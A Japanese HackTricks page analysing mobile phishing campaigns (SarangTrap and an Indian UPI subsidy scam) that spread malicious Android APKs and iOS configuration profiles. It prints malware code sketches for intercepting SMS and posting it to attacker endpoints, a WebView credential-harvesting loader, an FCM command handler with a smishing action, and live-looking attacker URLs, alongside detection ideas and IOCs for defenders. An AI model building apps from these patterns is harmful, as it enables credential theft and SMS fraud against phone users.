# モバイルフィッシングと悪意のあるアプリ配布 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターがフィッシング（SEO、ソーシャルエンジニアリング、偽のストア、出会い系アプリなど）を通じて**悪意のあるAndroid APK**と**iOSモバイル構成プロファイル**を配布するために使用する技術をカバーしています。
> この資料は、Zimperium zLabsによって暴露されたSarangTrapキャンペーン（2025年）およびその他の公的研究から適応されています。

## 攻撃フロー

1. **SEO/フィッシングインフラ**
* 類似ドメイン（出会い系、クラウド共有、車サービスなど）を多数登録します。
– Googleでランク付けするために、`<title>`要素に現地の言語のキーワードと絵文字を使用します。
– Android（`.apk`）とiOSのインストール手順の*両方*を同じランディングページにホストします。
2. **第一段階のダウンロード**
* Android: *署名されていない*または「サードパーティストア」のAPKへの直接リンク。
* iOS: 悪意のある**mobileconfig**プロファイルへの`itms-services://`または通常のHTTPSリンク（下記参照）。
3. **インストール後のソーシャルエンジニアリング**
* 初回起動時にアプリが**招待/確認コード**を要求します（排他的アクセスの幻想）。
* コードは**HTTP経由でPOST**され、コマンド＆コントロール（C2）に送信されます。
* C2は`{"success":true}`と応答 ➜ マルウェアが続行します。
* 有効なコードを提出しないサンドボックス/AVの動的分析は**悪意のある動作を見ない**（回避）。
4. **ランタイム権限の悪用** (Android)
* 危険な権限は**C2の肯定的な応答の後にのみ要求されます**：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- 古いビルドではSMS権限も要求されていました -->
```
* 最近のバリアントは**`AndroidManifest.xml`からSMSのための`<uses-permission>`を削除**しますが、リフレクションを通じてSMSを読み取るJava/Kotlinコードパスは残します ⇒ 権限を`AppOps`の悪用や古いターゲットを介して付与するデバイスで機能しながら静的スコアを下げます。
5. **ファサードUIとバックグラウンド収集**
* アプリは無害なビュー（SMSビューワー、ギャラリーピッカー）をローカルに実装して表示します。
* 同時に以下を外部流出させます：
- IMEI / IMSI、電話番号
- 完全な`ContactsContract`ダンプ（JSON配列）
- サイズを減らすために[Luban](https://github.com/Curzibn/Luban)で圧縮された`/sdcard/DCIM`からのJPEG/PNG
- オプションのSMS内容（`content://sms`）
ペイロードは**バッチ圧縮**され、`HTTP POST /upload.php`経由で送信されます。
6. **iOS配信技術**
* 単一の**モバイル構成プロファイル**は、デバイスを「MDM」のような監視に登録するために`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration`などを要求できます。
* ソーシャルエンジニアリングの指示：
1. 設定を開く ➜ *プロファイルがダウンロードされました*。
2. *インストール*を3回タップ（フィッシングページのスクリーンショット）。
3. 署名されていないプロファイルを信頼する ➜ 攻撃者は*連絡先*と*写真*の権限をApp Storeのレビューなしで取得します。
7. **ネットワーク層**
* 通常のHTTP、しばしばポート80で、`api.<phishingdomain>.com`のようなHOSTヘッダーを使用します。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLSなし → 簡単に見つけられる）。

## 防御テスト / レッドチームのヒント

* **動的分析の回避** – マルウェア評価中に、Frida/Objectionを使用して招待コードフェーズを自動化し、悪意のあるブランチに到達します。
* **マニフェストとランタイムの差分** – `aapt dump permissions`とランタイムの`PackageManager#getRequestedPermissions()`を比較します；危険な権限が欠けているのは赤信号です。
* **ネットワークカナリア** – `iptables -p tcp --dport 80 -j NFQUEUE`を設定して、コード入力後の不正なPOSTバーストを検出します。
* **mobileconfig検査** – macOSで`security cms -D -i profile.mobileconfig`を使用して`PayloadContent`をリストし、過剰な権限を特定します。

## ブルーチームの検出アイデア

* **証明書の透明性 / DNS分析**で、キーワードが豊富なドメインの突然のバーストをキャッチします。
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php`をGoogle Play外のDalvikクライアントから取得します。
* **招待コードのテレメトリ** – APKインストール後すぐに6〜8桁の数値コードのPOSTは、ステージングを示す可能性があります。
* **MobileConfig署名** – MDMポリシーを介して署名されていない構成プロファイルをブロックします。

## 有用なFridaスニペット: 招待コードの自動バイパス
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## インジケーター (一般)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – ドロッパー + FCM C2 パターン

このパターンは、インドのUPI資格情報とOTPを盗むために政府の利益テーマを悪用するキャンペーンで観察されています。オペレーターは、配信と耐障害性のために信頼できるプラットフォームを連鎖させます。

### 信頼できるプラットフォーム間の配信チェーン
- YouTube動画の誘引 → 説明に短縮リンクが含まれている
- 短縮リンク → 正規ポータルを模倣したGitHub Pagesフィッシングサイト
- 同じGitHubリポジトリが、ファイルに直接リンクする偽の「Google Play」バッジを持つAPKをホスト
- 動的フィッシングページはReplit上に存在し、リモートコマンドチャネルはFirebase Cloud Messaging (FCM)を使用

### 埋め込まれたペイロードとオフラインインストールを持つドロッパー
- 最初のAPKはインストーラー（ドロッパー）で、`assets/app.apk`に本物のマルウェアを搭載し、ユーザーにクラウド検出を鈍らせるためにWi-Fi/モバイルデータを無効にするよう促す。
- 埋め込まれたペイロードは無害なラベル（例：「セキュアアップデート」）の下にインストールされる。インストール後、インストーラーとペイロードは別々のアプリとして存在する。

静的トリアージのヒント（埋め込まれたペイロードをgrepする）：
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### ダイナミックエンドポイント発見 via shortlink
- マルウェアはshortlinkからプレーンテキストのカンマ区切りのライブエンドポイントリストを取得します。シンプルな文字列変換により、最終的なフィッシングページのパスが生成されます。

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
擬似コード:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebViewベースのUPI認証情報収集
- 「₹1 / UPI‑Liteの支払いを行う」ステップは、WebView内の動的エンドポイントから攻撃者のHTMLフォームを読み込み、敏感なフィールド（電話、銀行、UPI PIN）をキャプチャし、それらを`addup.php`に`POST`します。

最小ローダー:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自己伝播とSMS/OTPインターセプション
- 初回実行時に攻撃的な権限が要求される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 連絡先は、被害者のデバイスからスミッシングSMSを一斉送信するためにループされます。
- 受信したSMSはブロードキャストレシーバーによって傍受され、メタデータ（送信者、本文、SIMスロット、デバイスごとのランダムID）と共に`/addsm.php`にアップロードされます。

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) を堅牢な C2 として使用
- ペイロードは FCM に登録され、プッシュメッセージはアクションをトリガーするために使用される `_type` フィールドを持っています（例：フィッシングテキストテンプレートの更新、動作の切り替え）。

例 FCM ペイロード:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
ハンドラースケッチ:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### ハンティングパターンとIOC
- APKは`assets/app.apk`に二次ペイロードを含む
- WebViewは`gate.htm`から支払いを読み込み、`/addup.php`に外部送信する
- SMSは`/addsm.php`に外部送信する
- 短縮リンク駆動の設定取得（例：`rebrand.ly/*`）がCSVエンドポイントを返す
- 一般的な「更新/セキュア更新」としてラベル付けされたアプリ
- 信頼できないアプリでの`_type`識別子を持つFCM `data`メッセージ

### 検出と防御のアイデア
- インストール中にユーザーにネットワークを無効にするよう指示し、`assets/`から二次APKをサイドロードするアプリをフラグ付けする
- 権限タプル：`READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebViewベースの支払いフローにアラートを出す
- 非企業ホストでの`POST /addup.php|/addsm.php`の出口監視；既知のインフラをブロックする
- モバイルEDRルール：FCMに登録し、`_type`フィールドで分岐する信頼できないアプリ

---

## 参考文献

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
